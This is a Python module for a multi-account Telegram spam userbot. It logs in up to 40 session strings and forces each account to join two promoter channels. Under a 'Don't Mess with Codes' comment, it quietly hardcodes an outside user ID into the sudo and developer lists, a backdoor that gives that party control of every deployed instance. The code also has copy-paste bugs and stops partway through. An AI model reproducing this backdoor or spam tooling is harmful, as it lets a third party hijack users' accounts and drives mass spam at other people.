import os
import sys
import random
import asyncio
import telethon.utils
from telethon.tl import functions
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from decouple import config
from os import getenv
import logging
import time
from telethon.tl.functions.messages import ImportChatInviteRequest


logging.basicConfig(format='[%(levelname) 5s/%(asctime)s] %(name)s: %(message)s',
                    level=logging.WARNING)

#version

starversion = "v2.0.6"

#values
API_ID = config("API_ID", default=None, cast=int)
API_HASH = config("API_HASH", default=None)
ALIVE_NAME = config("ALIVE_NAME", default=None)
ALIVE_PIC = config("ALIVE_PIC", default=None)
ALIVE_TEXT = config("ALIVE_TEXT", default=None)
CMD_HNDLR = getenv("CMD_HNDLR", default=".")
HEROKU_APP_NAME = config("HEROKU_APP_NAME", None)
HEROKU_API_KEY = config("HEROKU_API_KEY", None)
STRING = config("STRING", default=None)
STRING2 = config("STRING2", default=None)
STRING3 = config("STRING3", default=None)
STRING4 = config("STRING4", default=None)
STRING5 = config("STRING5", default=None)
STRING6 = config("STRING6", default=None)
STRING7 = config("STRING7", default=None)
STRING8 = config("STRING8", default=None)
STRING9 = config("STRING9", default=None)
STRING10 = config("STRING10", default=None)
STRING11 = config("STRING11", default=None)
STRING12 = config("STRING12", default=None)
STRING13 = config("STRING13", default=None)
STRING14 = config("STRING14", default=None)
STRING15 = config("STRING15", default=None)
STRING16 = config("STRING16", default=None)
STRING17 = config("STRING17", default=None)
STRING18 = config("STRING18", default=None)
STRING19 = config("STRING19", default=None)
STRING20 = config("STRING20", default=None)
STRING21 = config("STRING21", default=None)
STRING22 = config("STRING22", default=None)
STRING23 = config("STRING23", default=None)
STRING24 = config("STRING24", default=None)
STRING25 = config("STRING25", default=None)
STRING26 = config("STRING26", default=None)
STRING27 = config("STRING27", default=None)
STRING28 = config("STRING28", default=None)
STRING29 = config("STRING29", default=None)
STRING30 = config("STRING30", default=None)
STRING31 = config("STRING31", default=None)
STRING32 = config("STRING32", default=None)
STRING33 = config("STRING33", default=None)
STRING34 = config("STRING34", default=None)
STRING35 = config("STRING35", default=None)
STRING36 = config("STRING36", default=None)
STRING37 = config("STRING37", default=None)
STRING38 = config("STRING38", default=None)
STRING39 = config("STRING39", default=None)
STRING40 = config("STRING40", default=None)
SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))
if 5463205082 not in SUDO_USERS:
    SUDO_USERS.append(5463205082)
OWNER_ID = int(os.environ.get("OWNER_ID", None))

# owner mention
mention = f"[{ALIVE_NAME}](tg://user?id={OWNER_ID})"

# Don't Mess with Codes !! 
DEV = list(map(int, getenv("FULLSUDO").split()))
if 5463205082 in SUDO_USERS:
    DEV.append(5463205082)
DB_URI = config("DATABASE_URL", None)
DEV.append(OWNER_ID)
SUDO_USERS.append(OWNER_ID)

# Sessions
async def StarX():
    global Star
    global Star2
    global Star3
    global Star5
    global Star4
    global Star6
    global Star7
    global Star8
    global Star9
    global Star10
    global Star11
    global Star12
    global Star13
    global Star14
    global Star15
    global Star16
    global Star17
    global Star18
    global Star19
    global Star20
    global Star21
    global Star22
    global Star23
    global Star25
    global Star24
    global Star26
    global Star27
    global Star28
    global Star29
    global Star30
    global Star31
    global Star32
    global Star33
    global Star34
    global Star35
    global Star36
    global Star37
    global Star38
    global Star39
    global Star40
    
    if STRING:
        session_name = str(STRING)
        print("String 1 Found")
        Star = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 1")
            await Star.start()
            botme = await Star.get_me()
            await Star(functions.account.UpdateProfileRequest(last_name="#1"))
            await Star(functions.channels.JoinChannelRequest(channel="@its_star_networm"))
            await Star(functions.channels.JoinChannelRequest(channel="@Best_FriendsFor_Ever"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            Star = "STRING"
            print(e)
            pass
    else:
        print("Session 1 Not Found")
        session_name = "starxspam"
        Star = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Star.start()
        except Exception as e:
            pass
   
    if STRING2:
        session_name = str(STRING2)
        print("String 2 Found")
        Star2 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 2")
            await Star2.start()
            await Star2(functions.account.UpdateProfileRequest(last_name="#2"))
            await Star2(functions.channels.JoinChannelRequest(channel="@its_star_network"))
            await Star2(functions.channels.JoinChannelRequest(channel="@Best_FriendsFor_Ever"))
            botme = await Star2.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 2 Not Found")
        pass
        session_name = "starxspam"
        Star2 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Star2.start()
        except Exception as e:
            pass

    if STRING3:
        session_name = str(STRING3)
        print("String 3 Found")
        Star3 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 3")
            await  Star3.start()
            await Star3(functions.account.UpdateProfileRequest(last_name="#3"))
            await Star3(functions.channels.JoinChannelRequest(channel="@its_star_network"))
            await Star3(functions.channels.JoinChannelRequest(channel="@Best_FriendsFor_Ever"))
            botme = await Star3.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 3 Not Found")
        pass
        session_name = "starxspam"
        Star3 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Star3.start()
        except Exception as e:
            pass

    if STRING4:
        session_name = str(STRING4)
        print("String 4 Found")
        Star4 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 4")
            await Star4.start()
            await Star4(functions.account.UpdateProfileRequest(last_name="#4"))
            await Star4(functions.channels.JoinChannelRequest(channel="@its_star_network"))
            await Star4(functions.channels.JoinChannelRequest(channel="@Best_FriendsFor_Ever"))
            botme = await Star4.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 4 Not Found")
        pass
        session_name = "starxspam"
        Star4 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Star4.start()
        except Exception as e:
            pass

    if STRING5:
        session_name = str(STRING5)
        print("String 5 Found")
        Star5 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 5")
            await Star5.start()
            await Star5(functions.account.UpdateProfileRequest(last_name="#5"))
            await Star5(functions.channels.JoinChannelRequest(channel="@its_star_network"))
            await Star5(functions.channels.JoinChannelRequest(channel="@Best_FriendsFor_Ever"))
            botme = await Star5.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 5 Not Found")
        pass
        session_name = "starxspam"
        Star5 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Star5.start()
        except Exception as e:
            pass
                  
    if STRING6:
        session_name = str(STRING6)
        print("String 6 Found")
        Star6 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 6")
            await Star6.start()
            await Star6(functions.account.UpdateProfileRequest(last_name="#6"))
            await Star6(functions.channels.JoinChannelRequest(channel="@its_star_network"))
            await Star6(functions.channels.JoinChannelRequest(channel="@Best_FriendsFor_Ever"))
            botme = await Star6.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 6 Not Found")
        pass
        session_name = "starxspam"
        Star6 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Star6.start()
        except Exception as e:
            pass

    if STRING7:
        session_name = str(STRING7)
        print("String 7 Found")
        Star7 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 7")
            await Star7.start()
            await Star7(functions.account.UpdateProfileRequest(last_name="#7"))
            await Star7(functions.channels.JoinChannelRequest(channel="@its_star_network"))
            await Star7(functions.channels.JoinChannelRequest(channel="@Best_FriendsFor_Ever"))
            botme = await Star7.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 7 Not Found")
        pass
        session_name = "starxspam"
        Star7 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Star7.start()
        except Exception as e:
            pass    
        
    
    if STRING8:
        session_name = str(STRING8)
        print("String 8 Found")
        Star8 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 8")
            await Star8.start()
            await Star8(functions.account.UpdateProfileRequest(last_name="#8"))
            await Star8(functions.channels.JoinChannelRequest(channel="@its_star_network"))
            await Star8(functions.channels.JoinChannelRequest(channel="@Best_FriendsFor_Ever"))
            botme = await Star8.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 8 Not Found")
        pass
        session_name = "starxspam"
        Star8 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Star8.start()
        except Exception as e:
            pass   
        
    if STRING9:
        session_name = str(STRING9)
        print("String 9 Found")
        Star9 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 9")
            await Star9.start()
            await Star9(functions.account.UpdateProfileRequest(last_name="#9"))
            await Star9(functions.channels.JoinChannelRequest(channel="@its_star_network"))
            await Star9(functions.channels.JoinChannelRequest(channel="@Best_FriendsFor_Ever"))
            botme = await Star9.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 9 Not Found")
        pass
        session_name = "starxspam"
        Star9 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Star9.start()
        except Exception as e:
            pass   
    
  
    if STRING10:
        session_name = str(STRING10)
        print("String 10 Found")
        Star10 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 10")
            await Star10.start()
            await Star10(functions.account.UpdateProfileRequest(last_name="#10"))
            await Star10(functions.channels.JoinChannelRequest(channel="@its_star_network"))
            await Star10(functions.channels.JoinChannelRequest(channel="@Best_FriendsFor_Ever"))
            botme = await Star10.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 10 Not Found")
        pass
        session_name = "starxspam"
        Star10 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Star10.start()
        except Exception as e:
            pass 
        
    
    if STRING11:
        session_name = str(STRING11)
        print("String 11 Found")
        Star11 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 11")
            await Star11.start()
            await Star11(functions.account.UpdateProfileRequest(last_name="#11"))
            await Star11(functions.channels.JoinChannelRequest(channel="@its_star_network"))
            await Star11(functions.channels.JoinChannelRequest(channel="@Best_FriendsFor_Ever"))
            botme = await Star11.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 11 Not Found")
        pass
        session_name = "starxspam"
        Star11 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Star11.start()
        except Exception as e:
            pass
        
    
    if STRING12:
        session_name = str(STRING12)
        print("String 12 Found")
        Star12 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 12")
            await Star12.start()
            await Star12(functions.account.UpdateProfileRequest(last_name="#12"))
            await Star12(functions.channels.JoinChannelRequest(channel="@its_star_network"))
            await Star12(functions.channels.JoinChannelRequest(channel="@Best_FriendsFor_Ever"))
            botme = await Star12.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 12 Not Found")
        pass
        session_name = "starxspam"
        Star12 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Star12.start()
        except Exception as e:
            pass   
    
  
    if STRING13:
        session_name = str(STRING13)
        print("String 13  Found")
        Star13 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 13")
            await Star13.start()
            await Star13(functions.account.UpdateProfileRequest(last_name="#13"))
            await Star13(functions.channels.JoinChannelRequest(channel="@Best_FriendsFor_Ever"))
            await Star13(functions.channels.JoinChannelRequest(channel="@its_star_network"))
            botme = await Star13.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 13 Not Found")
        pass
        session_name = "starxspam"
        Star13 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Star13.start()
        except Exception as e:
            pass 
        
    
    if STRING14:
        session_name = str(STRING14)
        print("String 14 Found")
        Star14 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 14")
            await Star14.start()
            await Star14(functions.account.UpdateProfileRequest(last_name="#14"))
            await Star14(functions.channels.JoinChannelRequest(channel="@its_star_network"))
            await Star14(functions.channels.JoinChannelRequest(channel="@Best_FriendsFor_Ever"))
            botme = await Star14.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 14 Not Found")
        pass
        session_name = "starxspam"
        Star14 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Star14.start()
        except Exception as e:
            pass
        
    
    if STRING15:
        session_name = str(STRING15)
        print("String 15 Found")
        Star15 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 15")
            await Star15.start()
            await Star15(functions.account.UpdateProfileRequest(last_name="#15"))
            await Star15(functions.channels.JoinChannelRequest(channel="@its_star_network"))
            await Star15(functions.channels.JoinChannelRequest(channel="@Best_FriendsFor_Ever"))
            botme = await Star15.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 15 Not Found")
        pass
        session_name = "starxspam"
        Star15 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Star15.start()
        except Exception as e:
            pass


    if STRING16:
        session_name = str(STRING16)
        print("String 16 Found")
        Star16 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 16")
            await Star16.start()
            await Star16(functions.account.UpdateProfileRequest(last_name="#16"))
            botme = await Star16.get_me()
            await Star16(functions.channels.JoinChannelRequest(channel="@its_star_network"))
            await Star16(functions.channels.JoinChannelRequest(channel="@Best_FriendsFor_Ever"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 16 Not Found")
        session_name = "starxspam"
        Star16 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Star16.start()
        except Exception as e:
            pass
   
    if STRING17:
        session_name = str(STRING17)
        print("String 17 Found")
        Star17 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 17")
            await Star17.start()
            await Star17(functions.account.UpdateProfileRequest(last_name="#17"))
            botme = await Star17.get_me()
            await Star17(functions.channels.JoinChannelRequest(channel="@Best_FriendsFor_Ever"))
            await Star17(functions.channels.JoinChannelRequest(channel="@its_star_network"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 17 Not Found")
        session_name = "starxspam"
        Star17 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Star17.start()
        except Exception as e:
            pass
   
    if STRING18:
        session_name = str(STRING18)
        print("String 18 Found")
        Star18 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 18")
            await Star18.start()
            await Star18(functions.account.UpdateProfileRequest(last_name="#18"))
            botme = await Star18.get_me()
            await Star18(functions.channels.JoinChannelRequest(channel="@its_star_network"))
            await Star18(functions.channels.JoinChannelRequest(channel="@Best_FriendsFor_Ever"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 18 Not Found")
        session_name = "starxspam"
        Star18 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Star18.start()
        except Exception as e:
            pass
   
    if STRING19:
        session_name = str(STRING19)
        print("String 19 Found")
        Star19 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 19")
            await Star19.start()
            await Star19(functions.account.UpdateProfileRequest(last_name="#19"))
            botme = await Star19.get_me()
            await Star19(functions.channels.JoinChannelRequest(channel="@its_star_network"))
            await Star19(functions.channels.JoinChannelRequest(channel="@Best_FriendsFor_Ever"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 19 Not Found")
        session_name = "starxspam"
        Star19 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Star.start()
        except Exception as e:
            pass
   
    if STRING20:
        session_name = str(STRING20)
        print("String 20 Found")
        Star20 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 20")
            await Star20.start()
            await Star20(functions.account.UpdateProfileRequest(last_name="#20"))
            botme = await Star20.get_me()
            await Star20(functions.channels.JoinChannelRequest(channel="@its_star_network"))
            await Star20(functions.channels.JoinChannelRequest(channel="@Best_FriendsFor_Ever"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 20 Not Found")
        session_name = "starxspam"
        Star20 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Star20.start()
        except Exception as e:
            pass

    if STRING21:
        session_name = str(STRING21)
        print("String 21 Found")
        Star21 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 21")
            await Star21.start()
            await Star21(functions.account.UpdateProfileRequest(last_name="#21"))
            botme = await Star21.get_me()
            await Star21(functions.channels.JoinChannelRequest(channel="@its_star_network"))
            await Star21(functions.channels.JoinChannelRequest(channel="@Best_FriendsFor_Ever"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 21 Not Found")
        session_name = "starxspam"
        Star21 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Star21.start()
        except Exception as e:
            pass
   
    if STRING22:
        session_name = str(STRING22)
        print("String 22 Found")
        Star22 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 22")
            await Star22.start()
            await Star22(functions.account.UpdateProfileRequest(last_name="#22"))
            await Star22(functions.channels.JoinChannelRequest(channel="@its_star_network"))
            await Star22(functions.channels.JoinChannelRequest(channel="@Best_FriendsFor_Ever"))
            botme = await Star22.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 22 Not Found")
        pass
        session_name = "starxspam"
        Star22 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Star22.start()
        except Exception as e:
            pass

    if STRING23:
        session_name = str(STRING23)
        print("String 23 Found")
        Star23 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 23")
            await  Star23.start()
            await Star23(functions.account.UpdateProfileRequest(last_name="#23"))
            await Star23(functions.channels.JoinChannelRequest(channel="@its_star_network"))
            await Star23(functions.channels.JoinChannelRequest(channel="@Best_FriendsFor_Ever"))
            botme = await Star23.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 23 Not Found")
        pass
        session_name = "starxspam"
        Star23 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Star23.start()
        except Exception as e:
            pass

    if STRING24:
        session_name = str(STRING24)
        print("String 24 Found")
        Star24 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 24")
            await Star24.start()
            await Star24(functions.account.UpdateProfileRequest(last_name="#24"))
            await Star24(functions.channels.JoinChannelRequest(channel="@its_star_network"))
            await Star24(functions.channels.JoinChannelRequest(channel="@Best_FriendsFor_Ever"))
            botme = await Star24.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 24 Not Found")
        pass
        session_name = "starxspam"
        Star24 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Star24.start()
        except Exception as e:
            pass

    if STRING25:
        session_name = str(STRING25)
        print("String 25 Found")
        Star25 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 25")
            await Star25.start()
            await Star25(functions.account.UpdateProfileRequest(last_name="#25"))
            await Star25(functions.channels.JoinChannelRequest(channel="@its_star_network"))
            await Star25(functions.channels.JoinChannelRequest(channel="@Best_FriendsFor_Ever"))
            botme = await Star25.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 25 Not Found")
        pass
        session_name = "starxspam"
        Star25 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Star25.start()
        except Exception as e:
            pass
                  
    if STRING26:
        session_name = str(STRING26)
        print("String 26 Found")
        Star26 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 26")
            await Star26.start()
            await Star26(functions.account.UpdateProfileRequest(last_name="#26"))
            await Star26(functions.channels.JoinChannelRequest(channel="@its_star_network"))
            await Star26(functions.channels.JoinChannelRequest(channel="@Best_FriendsFor_Ever"))
            botme = await Star26.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 26 Not Found")
        pass
        session_name = "starxspam"
        Star26 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Star26.start()
        except Exception as e:
            pass

    if STRING27:
        session_name = str(STRING27)
        print("String 27 Found")
        Star27 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 27")
            await Star27.start()
            await Star27(functions.account.UpdateProfileRequest(last_name="#27"))
            await Star27(functions.channels.JoinChannelRequest(channel="@its_star_network"))
            await Star27(functions.channels.JoinChannelRequest(channel="@Best_FriendsFor_Ever"))
            botme = await Star27.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 27 Not Found")
        pass
        session_name = "starxspam"
        Star27 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Star27.start()
        except Exception as e:
            pass    
        
    
    if STRING28:
        session_name = str(STRING28)
        print("String 28 Found")
        Star28 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 28")
            await Star28.start()
            await Star(functions.account.UpdateProfileRequest(last_name="#28"))
            await Star28(functions.channels.JoinChannelRequest(channel="@its_star_network"))
            await Star28(functions.channels.JoinChannelRequest(channel="@Best_FriendsFor_Ever"))
            botme = await Star28.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 28 Not Found")
        pass
        session_name = "starxspam"
        Star28 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Star28.start()
        except Exception as e:
            pass   
        
    if STRING29:
        session_name = str(STRING29)
        print("String 29 Found")
        Star29 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 29")
            await Star29.start()
            await Star29(functions.account.UpdateProfileRequest(last_name="#29"))
            await Star29(functions.channels.JoinChannelRequest(channel="@its_star_network"))
            await Star29(functions.channels.JoinChannelRequest(channel="@Best_FriendsFor_Ever"))
            botme = await Star29.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 29 Not Found")
        pass
        session_name = "starxspam"
        Star29 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Star29.start()
        except Exception as e:
            pass   
    
  
    if STRING30:
        session_name = str(STRING30)
        print("String 30 Found")
        Star30 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 30")
            await Star30.start()
            await Star30(functions.account.UpdateProfileRequest(last_name="#30"))
            await Star30(functions.channels.JoinChannelRequest(channel="@its_star_network"))
            await Star30(functions.channels.JoinChannelRequest(channel="@Best_FriendsFor_Ever"))
            botme = await Star30.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 30 Not Found")
        pass
        session_name = "starxspam"
        Star30 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Star30.start()
        except Exception as e:
            pass 
        
    
    if STRING31:
        session_name = str(STRING31)
        print("String 31 Found")
        Star31 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 31")
            await Star31.start()
            await Star31(functions.account.UpdateProfileRequest(last_name="#31"))
            await Star31(functions.channels.JoinChannelRequest(channel="@its_star_network"))
            await Star31(functions.channels.JoinChannelRequest(channel="@Best_FriendsFor_Ever"))
            botme = await Star31.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 31 Not Found")
        pass
        session_name = "starxspam"
        Star31 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Star31.start()
        except Exception as e:
            pass
        
    
    if STRING32:
        session_name = str(STRING32)
        print("String 32 Found")
        Star32 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 32")
            await Star32.start()
            await Star32(functions.account.UpdateProfileRequest(last_name="#32"))
            await Star32(functions.channels.JoinChannelRequest(channel="@its_star_network"))
            await Star32(functions.channels.JoinChannelRequest(channel="@Best_FriendsFor_Ever"))
            botme = await Star32.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 32 Not Found")
        pass
        session_name = "starxspam"
        Star32 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Star32.start()
        except Exception as e:
            pass   
    
  
    if STRING33:
        session_name = str(STRING33)
        print("String 33  Found")
        Star33 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 33")
            await Star33.start()
            await Star33(functions.account.UpdateProfileRequest(last_name="#33"))
            await Star33(functions.channels.JoinChannelRequest(channel="@Best_FriendsFor_Ever"))
            await Star33(functions.channels.JoinChannelRequest(channel="@its_star_network"))
            botme = await Star33.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 33 Not Found")
        pass
        session_name = "starxspam"
        Star33 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Star33.start()
        except Exception as e:
            pass 
        
    
    if STRING34:
        session_name = str(STRING34)
        print("String 34 Found")
        Star34 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 34")
            await Star34.start()
            await Star34(functions.account.UpdateProfileRequest(last_name="#34"))
            await Star34(functions.channels.JoinChannelRequest(channel="@its_star_network"))
            await Star34(functions.channels.JoinChannelRequest(channel="@Best_FriendsFor_Ever"))
            botme = await Star34.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 34 Not Found")
        pass
        session_name = "starxspam"
        Star34 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Star34.start()
        except Exception as e:
            pass
        
    
    if STRING35:
        session_name = str(STRING35)
        print("String 35 Found")
        Star35 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 35")
            await Star35.start()
            await Star35(functions.account.UpdateProfileRequest(last_name="#35"))
            await Star35(functions.channels.JoinChannelRequest(channel="@its_star_network"))
            await Star35(functions.channels.JoinChannelRequest(channel="@Best_FriendsFor_Ever"))
            botme = await Star35.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 35 Not Found")
        pass
        session_name = "starxspam"
        Star35 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Star35.start()
        except Exception as e:
            pass


    if STRING36:
        session_name = str(STRING36)
        print("String 36 Found")
        Star36 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 36")
            await Star36.start()
            await Star36(functions.account.UpdateProfileRequest(last_name="#36"))
            botme = await Star36.get_me()
            await Star36(functions.channels.JoinChannelRequest(channel="@its_star_network"))
            await Star36(functions.channels.JoinChannelRequest(channel="@Best_FriendsFor_Ever"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 36 Not Found")
        session_name = "starxspam"
        Star36 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Star36.start()
        except Exception as e:
            pass
   
    if STRING37:
        session_name = str(STRING37)
        print("String 37 Found")
        Star37 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 37")
            await Star37.start()
            await Star37(functions.account.UpdateProfileRequest(last_name="#37"))
            botme = await Star37.get_me()
            await Star37(functions.channels.JoinChannelRequest(channel="@Best_FriendsFor_Ever"))
            await Star37(functions.channels.JoinChannelRequest(channel="@its_star_network"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 37 Not Found")
        session_name = "starxspam"
